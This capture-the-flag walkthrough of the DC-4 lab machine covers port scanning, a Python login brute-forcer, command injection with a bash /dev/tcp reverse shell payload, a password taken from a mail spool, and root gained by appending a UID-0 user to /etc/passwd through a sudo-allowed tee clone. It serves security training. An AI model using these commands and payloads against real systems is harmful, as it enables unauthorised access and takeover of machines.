## DC-4 Walkthrough

### 1. Reconnaissance

The initial phase involved identifying the target machine's IP address and enumerating its open ports and services.

- **Identify Target IP**:
Using `netdiscover`, the target machine was identified at `192.168.1.26`.

```shellscript
netdiscover
```

The output showed `192.168.1.26 08:00:27:72:86:54 PCS Systemtechnik GmbH`, indicating a VirtualBox VM.


- **Port Scanning**:
A comprehensive `nmap` scan was performed to identify all open ports and services running on the target.

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.26 -p-
```

The scan revealed two open ports:

- `22/tcp`: Running `OpenSSH 7.4p1 Debian`.
- `80/tcp`: Running `nginx 1.15.10` (HTTP service).



- **Web Enumeration**:
Given that port 80 was open, web content enumeration was performed using `gobuster` to discover hidden directories and files.

```shellscript
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.26
```

This initial scan revealed `/images` and `/css` directories. To find more relevant files, the scan was extended to include common web file extensions.

```shellscript
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.26 -x php,txt,bak
```

This scan yielded several interesting PHP files:

- `/index.php`
- `/login.php` (redirects to `index.php`)
- `/logout.php` (redirects to `index.php`)
- `/command.php` (redirects to `index.php`)


The presence of `login.php` and `command.php` suggested potential authentication and command execution vulnerabilities.




### 2. Initial Foothold (Web Exploitation)

The `command.php` file was particularly interesting. Upon visiting `http://192.168.1.26/command.php` in a browser, it redirected to `index.php`, indicating that authentication was required to access it.



The next step was to attempt to brute-force the login page. A `login.req` file was created to capture the POST request for the login form:

```plaintext
POST /login.php HTTP/1.1
Host: 192.168.1.26
Content-Length: 29
Cache-Control: max-age=0
Origin: http://192.168.1.26
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.26/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Cookie: PHPSESSID=7v74mbp5c8papn13l2a8pdqjq4
Connection: keep-alive

username=admin&password=admin
```

Initial attempts with `sqlmap` on `login.php` did not yield any SQL injection vulnerabilities.

```shellscript
sqlmap -r login.req --batch --level=5 --risk=3 --threads=5
```

Sqlmap reported that parameters `username`, `password`, and `PHPSESSID` did not appear to be dynamic or injectable.

Next, `hydra` was used to brute-force the login form with the `admin` username and the `rockyou.txt` wordlist. Multiple attempts were made to find the correct success condition.

```shellscript
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.26 http-post-form "/login.php:username=^USER^&password=^PASS^:M=logged" -V -I
```

This command attempts to find a successful login by looking for the string "logged" in the response, which is present on the `command.php` page after a successful login. However, `hydra` reported many "valid passwords found," which was suspicious.

To get a more accurate result, a custom Python script was used to detect successful logins by checking the response length. A failed login to `login.php` results in a 302 redirect to `index.php` with a content length of 206. A successful login would redirect to `command.php` (or `index.php` showing "logged in") with a different content length.

```python
import requests

url = "http://192.168.1.26/login.php"
i=0
with open("/usr/share/wordlists/rockyou.txt","r") as file:
    for line in file:
        i+=1
        password = line.strip()
        print(f"[*] {i} password tested. Current : ",password)
        data= {
            "username":"admin",
            "password":password
        }
        res = requests.post(url,data=data,allow_redirects=False)
        if len(res.text) != 206:
            print("[+] Found password : ",password)
            break
```Running this script quickly found the correct password:
```bash
python3 bruteforce_login.py
# ... (output omitted for brevity)
[*] 463 password tested. Current :  happy
[+] Found password :  happy
```The credentials `admin:happy` were successfully found.

Upon logging in with `admin:happy`, the `command.php` page became accessible. This page presented a simple interface to run commands like "List Files", "Disk Usage", and "Disk Free". The Burp Suite screenshot clearly shows the `ls -l` command being executed via the `radio` parameter in a POST request to `command.php`. This confirms a command injection vulnerability.

<img width="544" height="373" alt="image" src="https://github.com/user-attachments/assets/7351bd6f-9aeb-4e76-a073-81a2005d3b1b" />
<img width="1366" height="613" alt="image" src="https://github.com/user-attachments/assets/3b5b8bbc-54e6-404b-8f8b-e2fac472bc94" />

To gain a reverse shell, a `netcat` listener was set up on the attacking machine:
```bash
nc -lvnp 4444
```Then, a reverse shell payload was injected via the `command.php` interface. While the exact payload used to get the shell is not explicitly shown in the provided logs, a common method would be to use a `bash` reverse shell command, for example, by modifying the `radio` parameter to something like `radio=ls+-l;bash+-i+>&+/dev/tcp/192.168.1.X/4444+0>&1&submit=Run`.

A shell was successfully obtained as the `www-data` user.
```bash
www-data@dc-4:/usr/share/nginx/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 3. Privilege Escalation to User `jim`

With the `www-data` shell, local enumeration began. The `/home` directory was checked for other users.

```shellscript
www-data@dc-4:/home$ ls
charles
jim
sam
```

Three user directories were found: `charles`, `jim`, and `sam`.

The `jim` user's directory was explored first:

```shellscript
www-data@dc-4:/home/jim$ ls -la
total 32
drwxr-xr-x 3 jim  jim  4096 Apr  7  2019 .
drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
-rw------- 1 jim  jim   528 Apr  6  2019 mbox
-rwsrwxrwx 1 jim  jim   174 Apr  6  2019 test.sh
```

Several interesting files were found:

- `backups/`: A directory that might contain sensitive information.
- `mbox`: A mailbox file, often containing emails.
- `test.sh`: A script with SUID permissions (`-rwsrwxrwx`), owned by `jim`.


Attempts were made to exploit `test.sh` by modifying it to execute `/bin/bash -p` (to preserve privileges). However, SUID on scripts is generally ignored by Linux for security reasons, and this attempt did not result in privilege escalation.

The `jim` user's mailbox was then examined. The critical discovery of Charles's password was made by directly viewing the mail spool file at `/var/mail/jim`.

```shellscript
www-data@dc-4:/var/mail$ cat jim
# ... (email headers omitted)
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O
Hi Jim,
I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
Password is:  ^xHhA&hvim0y
See ya,
Charles
```

This was a critical find! An email from `charles` to `jim` contained `charles`'s password: `^xHhA&hvim0y`.

The `su` command was used to switch to the `charles` user:

```shellscript
www-data@dc-4:/var/mail$ su charles
Password: ^xHhA&hvim0y
charles@dc-4:/var/mail$
```

Successfully logged in as `charles`.

### 4. Privilege Escalation to Root

As the `charles` user, the `sudo` permissions were immediately checked:

```shellscript
charles@dc-4:~$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

This was a clear path to root! The `charles` user could run `/usr/bin/teehee` as `root` without a password.

The `teehee` binary was investigated. Running `./teehee --help` on the local machine (after copying it via `scp`) revealed that it is a clone of the `tee` command, which copies standard input to standard output and also to files. The crucial option was `-a, --append`, which allows appending to files instead of overwriting them.

```shellscript
./teehee --help
# ... (output omitted for brevity)
Usage: ./teehee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.
  -a, --append              append to the given FILEs, do not overwrite
# ...
```

This meant `charles` could append content to any file on the system as root. The `/etc/passwd` file was the target for creating a new root user.

First, a new password hash for a new root user (`rootclone`) was generated using `openssl passwd -6` (for SHA512 hash):

```shellscript
openssl passwd -6 'MySecurePass123'
$6$d1DTAAyDxTQJ2Pmw$pxrUTJwQwsktpRnMIOe4xrtd87z9aPmQlObicRuRP1PHs7Pha6XvyxCujHtIYuF0HkZhANlJJZUT9/b7RcgF10
```

Then, this hash was used to create a new root user entry and append it to `/etc/passwd` using `sudo /usr/bin/teehee -a`:

```shellscript
echo 'rootclone:$6$d1DTAAyDxTQJ2Pmw$pxrUTJwQwsktpRnMIOe4xrtd87z9aPmQlObicRuRP1PHs7Pha6XvyxCujHtIYuF0HkZhANlJJZUT9/b7RcgF10:0:0:Root Clone:/root:/bin/bash' | sudo /usr/bin/teehee -a /etc/passwd
```

The `/etc/passwd` file was then checked to confirm the new user entry:

```shellscript
charles@dc-4:~$ cat /etc/passwd
# ... (existing entries)
rootclone:$6$d1DTAAyDxTQJ2Pmw$pxrUTJwQwsktpRnMIOe4xrtd87z9aPmQlObicRuRP1PHs7Pha6XvyxCujHtIYuF0HkZhANlJJZUT9/b7RcgF10:0:0:Root Clone:/root:/bin/bash
```

The `rootclone` user with UID 0 (root) was successfully added.

Finally, `su` was used to switch to the `rootclone` user:

```shellscript
charles@dc-4:~$ su rootclone
Password: MySecurePass123
root@dc-4:/home/charles# id
uid=0(root) gid=0(root) groups=0(root)
```

Root access was successfully achieved!

### 5. Root Flag

The final step was to retrieve the root flag from the `/root` directory.

```shellscript
root@dc-4:/home/charles# cd /root
root@dc-4:~# ls
flag.txt
root@dc-4:~# cat flag.txt
888       888          888 888      8888888b.
# ... (ASCII art omitted)
Congratulations!!!
Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.
If you enjoyed this CTF, send me a tweet via @DCAU7.
```

The root flag was the congratulatory message and ASCII art in `flag.txt`.

## Conclusion

The DC-4 challenge provided a comprehensive learning experience, covering:

1. **Reconnaissance**: Identifying the target and its open services.
2. **Web Application Brute-forcing**: Successfully bypassing a login page using a custom script to identify the correct credentials.
3. **Command Injection**: Leveraging a web interface to execute commands and gain an initial shell.
4. **Local Enumeration**: Discovering sensitive files (specifically `jim`'s mailbox at `/var/mail/jim`) containing credentials for other users.
5. **Privilege Escalation via `sudo` Misconfiguration**: Exploiting a `NOPASSWD` entry for a custom `tee` binary (`teehee`) to modify `/etc/passwd` and gain root access.


This challenge highlighted the importance of secure web application development, proper file permissions, and careful `sudo` configuration.

## Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service version detection
- `gobuster` - Directory and file enumeration
- `python3` with `requests` - Custom login brute-force script
- `netcat` - Setting up listeners for reverse shells
- `ls`, `cd`, `cat`, `find`, `su`, `sudo` - Basic Linux commands for enumeration and privilege management
- `openssl passwd` - Generating password hashes
- `r2` (Radare2) - Binary analysis (used to confirm `teehee` functionality)

